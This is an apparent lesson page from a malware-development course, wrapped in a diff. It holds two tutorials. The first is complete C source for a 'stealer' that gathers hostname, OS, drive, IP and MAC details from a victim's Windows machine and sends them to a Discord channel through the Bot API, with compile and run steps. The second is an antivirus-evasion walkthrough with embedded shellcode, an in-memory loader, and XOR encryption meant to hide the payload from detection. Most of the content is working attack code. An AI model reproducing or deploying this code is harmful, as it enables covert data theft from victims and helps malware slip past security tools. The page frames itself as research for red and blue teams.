@@ -1,0 +1,2399 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development trick. Stealing data via legit Discord Bot</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #22</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development trick. Stealing data via legit Discord Bot</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">API. Simple C example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous examples we created a simple Proof of Concept of using legit C2connections via Telegram Bot API, VirusTotal API for “stealing” simplest information</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">from victim’s Windows machine.
+What about next legit application: Discord and it’s Bot API feature?
+practical example
+Many of yours may think that I am simply copying the same code, please note that this
+is only for understanding the concepts. First of all create Discord application:
+
+Called meow-test in my case.
+As you can see, discord generated app ID and token, we will need APPLICATION_ID
+later:
+
+Within your application, create a bot user with full permissions:
+
+442
+
+
+
+As you can see, we have obtained a token for the bot. So, according to the documentation,</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">we need the following logic for sending messages:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">#define DISCORD_BOT_TOKEN "your discord bot token" // replace with your actual bot token #define DISCORD_CHANNEL_ID "your discord channel id" // replace with the channel ID where yo</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// function to send a message to discord using the discord Bot API
+int sendToDiscord(const char* message) {
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+HINTERNET hRequest = NULL;
+
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+if (hSession == NULL) {
+fprintf(stderr, "WinHttpOpen. error: %d has occurred.\n", GetLastError());
+return 1;
+}
+hConnect = WinHttpConnect(hSession, L"discord.com",
+INTERNET_DEFAULT_HTTPS_PORT, 0);
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+return 1;
+}
+hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v10/channels/"
+DISCORD_CHANNEL_ID "/messages", NULL, WINHTTP_NO_REFERER,
+WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+// set headers
+if (!WinHttpAddRequestHeaders(hRequest, L"Authorization: Bot "
+DISCORD_BOT_TOKEN "\r\nContent-Type: application/json\r\n", -1,
+WINHTTP_ADDREQ_FLAG_ADD)) {
+fprintf(stderr, "WinHttpAddRequestHeaders. error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+// construct JSON payload
+char json_body[1024];
+snprintf(json_body, sizeof(json_body), "{\"content\": \"%s\"}", message);
+// send the request
+if (!WinHttpSendRequest(hRequest, NULL, -1, (LPVOID)json_body,
+strlen(json_body), strlen(json_body), 0)) {
+fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+// receive response
+BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
+if (!hResponse) {
+fprintf(stderr, "WinHttpReceiveResponse. error %d has occurred.\n", GetLastError());
+}
+DWORD code = 0;
+DWORD codeS = sizeof(code);
+if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+WINHTTP_HEADER_NAME_BY_INDEX, &amp;code, &amp;codeS,
+WINHTTP_NO_HEADER_INDEX)) {
+if (code == 200) {
+printf("message sent successfully to discord.\n");
+} else {
+printf("failed to send message to discord. HTTP status code: %d\n", code);
+}
+} else {
+DWORD error = GetLastError();
+LPSTR buffer = NULL;
+FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |
+FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+NULL, error, 0, (LPSTR)&amp;buffer, 0, NULL);
+printf("unknown error: %s\n", buffer);
+LocalFree(buffer);
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hSession);
+return 0;
+}
+In your Discord server, navigate to the channel where you want your bot to send messages. Right-click on the channel name, select Copy ID or Copy Link in my case
+(discord in browser), and you’ll have the channel ID:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The full source is looks like this (hack.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winhttp.h&gt;
+#include &lt;iphlpapi.h&gt;
+
+#define DISCORD_BOT_TOKEN "your discord bot token" // replace with your actual bot token
+#define DISCORD_CHANNEL_ID "your discord channel id" // replace with the channel ID where yo
+// function to send a message to discord using the discord Bot API
+int sendToDiscord(const char* message) {
+HINTERNET hSession = NULL;
+HINTERNET hConnect = NULL;
+HINTERNET hRequest = NULL;
+hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+if (hSession == NULL) {
+
+fprintf(stderr, "WinHttpOpen. error: %d has occurred.\n", GetLastError());
+return 1;
+}
+hConnect = WinHttpConnect(hSession, L"discord.com",
+INTERNET_DEFAULT_HTTPS_PORT, 0);
+if (hConnect == NULL) {
+fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hSession);
+return 1;
+}
+hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v10/channels/"
+DISCORD_CHANNEL_ID "/messages", NULL, WINHTTP_NO_REFERER,
+WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+if (hRequest == NULL) {
+fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+// set headers
+if (!WinHttpAddRequestHeaders(hRequest, L"Authorization: Bot "
+DISCORD_BOT_TOKEN "\r\nContent-Type: application/json\r\n", -1,
+WINHTTP_ADDREQ_FLAG_ADD)) {
+fprintf(stderr, "WinHttpAddRequestHeaders. error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+// construct JSON payload
+char json_body[1024];
+snprintf(json_body, sizeof(json_body), "{\"content\": \"%s\"}", message);
+// send the request
+if (!WinHttpSendRequest(hRequest, NULL, -1, (LPVOID)json_body,
+strlen(json_body), strlen(json_body), 0)) {
+fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hSession);
+return 1;
+}
+
+// receive response
+BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
+if (!hResponse) {
+fprintf(stderr, "WinHttpReceiveResponse. error %d has occurred.\n", GetLastError());
+}
+DWORD code = 0;
+DWORD codeS = sizeof(code);
+if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE |
+WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX,
+&amp;code, &amp;codeS, WINHTTP_NO_HEADER_INDEX)) {
+if (code == 200) {
+printf("message sent successfully to discord.\n");
+} else {
+printf("failed to send message to discord. HTTP status code: %d\n", code);
+}
+} else {
+DWORD error = GetLastError();
+LPSTR buffer = NULL;
+FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |
+FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+NULL, error, 0, (LPSTR)&amp;buffer, 0, NULL);
+printf("unknown error: %s\n", buffer);
+LocalFree(buffer);
+}
+WinHttpCloseHandle(hConnect);
+WinHttpCloseHandle(hRequest);
+WinHttpCloseHandle(hSession);
+return 0;
+}
+int main(int argc, char* argv[]) {
+// test message
+const char* message = "meow-meow";
+sendToDiscord(message);
+char systemInfo[4096];
+// get host name
+CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
+DWORD size = sizeof(hostName) / sizeof(hostName[0]);
+GetComputerNameA(hostName, &amp;size);
+
+// get OS version
+OSVERSIONINFO osVersion;
+osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+GetVersionEx(&amp;osVersion);
+// get system information
+SYSTEM_INFO sysInfo;
+GetSystemInfo(&amp;sysInfo);
+// get logical drive information
+DWORD drives = GetLogicalDrives();
+// get IP address
+IP_ADAPTER_INFO adapterInfo[16]; // Assuming there are no more than 16 adapters
+DWORD adapterInfoSize = sizeof(adapterInfo);
+if (GetAdaptersInfo(adapterInfo, &amp;adapterInfoSize) != ERROR_SUCCESS) {
+printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
+return 1;
+}
+snprintf(systemInfo, sizeof(systemInfo),
+"Host Name: %s, "
+"OS Version: %d.%d.%d, "
+"Processor Architecture: %d, "
+"Number of Processors: %d, "
+"Logical Drives: %X, ",
+hostName,
+osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
+sysInfo.wProcessorArchitecture,
+sysInfo.dwNumberOfProcessors,
+drives);
+// add IP address information
+for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL;
+adapter = adapter-&gt;Next) {
+snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
+"Adapter Name: %s, "
+"IP Address: %s, "
+"Subnet Mask: %s, "
+"MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
+adapter-&gt;AdapterName,
+adapter-&gt;IpAddressList.IpAddress.String,
+adapter-&gt;IpAddressList.IpMask.String,
+adapter-&gt;Address[0], adapter-&gt;Address[1], adapter-&gt;Address[2],
+adapter-&gt;Address[3], adapter-&gt;Address[4], adapter-&gt;Address[5]);
+}
+
+// send system info to discord
+sendToDiscord(systemInfo);
+return 0;
+}
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s check everything in action.</p>
+
+            <div id="compile-our-stealer-hack-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile our “stealer” hack.c:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive \ -liphlpapi -lwinhttp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Before running on test victim machine we need authorize our bot to sending messages to channel:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://discord.com/api/oauth2/authorize?client_id=123456789012345678&permissions=0&scope=bo Replace cliend id with yours:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run it on my Windows 11 VM: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, messages posted successfully in our channel.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run on Windows 10 x64 VM with wireshark: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And monitoring traffic via Wireshark we got an IP address 104.26.11.240: whois 104.26.11.240</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As far as I know, Discord uses Cloudflare, so I assume this is the our Discord API ip address. I hope this post with practical example is useful for malware researchers, red teamers, spreads awareness to the blue teamers of this interesting technique. Using Telegram API example Using VirusTotal API example Discord API Reference source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">54. AV engines evasion for C++ simple malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">AV evasion has always being challenging for red teamers and pentesters, especially for those who write malwares. In our tutorial, we will write a simple malware in C++ that will launch our payload: calc.exe process. Then we check through virustotal how many AV engines detect our malware, after which we will try to reduce the number of AV engines that will detect our malware. Let’s start with simple C++ code of our malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+cpp implementation malware example with calc.exe payload
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+// our payload calc.exe
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+int main(void) {
+void * my_payload_mem; // memory buffer for payload
+BOOL rv;
+HANDLE th;
+DWORD oldprotect = 0;
+// Allocate a memory buffer for payload
+my_payload_mem = VirtualAlloc(0, my_payload_len,
+MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+// copy payload to buffer
+RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
+// make new buffer as executable
+rv = VirtualProtect(my_payload_mem, my_payload_len,
+PAGE_EXECUTE_READ, &amp;oldprotect);
+if ( rv != 0 ) {
+// run payload
+th = CreateThread(0, 0,
+(LPTHREAD_START_ROUTINE) my_payload_mem,
+0, 0, 0);
+WaitForSingleObject(th, -1);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So we have just one function main(void) function:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and we have sizeof(my_payload) size of payload. For simplicity, we use calc.exe as the payload. Without delving into the generation of the payload, we will simply substitute the finished payload into our code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+And the main logic of our main function is:
+
+Let’s go to investigate this logic. If you want to run our payload in the memory of the
+process, we have to do couple of things. We have to create a new memory buffer, copy</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">our payload into the buffer, and a start executing this buffer. The first we do we allocate new memory region in a process and we store the address in my_payload_mem variable:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and this memory region is readable and writeable. Then, we copy our my_payload to my_payload_mem:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And then we set our buffer to be executable:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Ok, everything is good but why I am not doing this in 44 line???</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">why not just allocate a buffer which is readable writable and executable? And the reason is pretty simple. Some hunting tools and AV engines can spot this memory region, because it’s quite unusable that the process needs a memory which is readable, writeable and executable at the same time. So to bypass this kind of detection we are doing in a two steps. And if everything goes well, we run our payload as the separate new thread in a process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our malware:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run (on Windows 10 x64):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So basically this is how you can store your payload in a .text section without encryption. Let’s go to upload our evil.exe to Virustotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/c9c49dbbb0a668df053d0ab788f9dde2d9e59c31 672b5d296bb1e8309d7e0dfe/detection So, 22 of of 66 AV engines detect our file as malicious. Let’s go to try to reduce the number of AV engines that will detect our malware. For this first we must encrypt our payload. Why we want to encrypt our payload? The basic purpose of doing this to hide you payload from someone like AV engine or reverse engineer. So that reverse engineer cannot easily identify your payload. The purpose of encryption is the transform data in order to keep it secret from others. For simplicity, we use XOR encryption for our case. Let’s take a look at how to use XOR to encrypt and decrypt our payload. Update our simple malware code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">/*
+
+cpp implementation malware
+example with calc.exe payload
+encrypted via XOR
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+// our payload calc.exe
+unsigned char my_payload[] = {};
+unsigned int my_payload_len = sizeof(my_payload);
+// key for XOR decrypt
+char my_secret_key[] = "mysupersecretkey";
+// decrypt deXOR function
+void XOR(char * data, size_t data_len, char * key,
+size_t key_len) {
+int j;
+j = 0;
+for (int i = 0; i &lt; data_len; i++) {
+if (j == key_len - 1) j = 0;
+data[i] = data[i] ^ key[j];
+j++;
+}
+}
+
+int main(void) {
+void * my_payload_mem; // memory buffer for payload
+BOOL rv;
+HANDLE th;
+DWORD oldprotect = 0;
+// Allocate a memory buffer for payload
+my_payload_mem = VirtualAlloc(0, my_payload_len,
+MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+// Decrypt (DeXOR) the payload
+XOR((char *) my_payload, my_payload_len,
+my_secret_key, sizeof(my_secret_key));
+// copy payload to buffer
+RtlMoveMemory(my_payload_mem, my_payload,
+my_payload_len);
+
+// make new buffer as executable
+rv = VirtualProtect(my_payload_mem,
+my_payload_len,
+PAGE_EXECUTE_READ, &amp;oldprotect);
+if ( rv != 0 ) {
+// run payload
+th = CreateThread(0, 0,
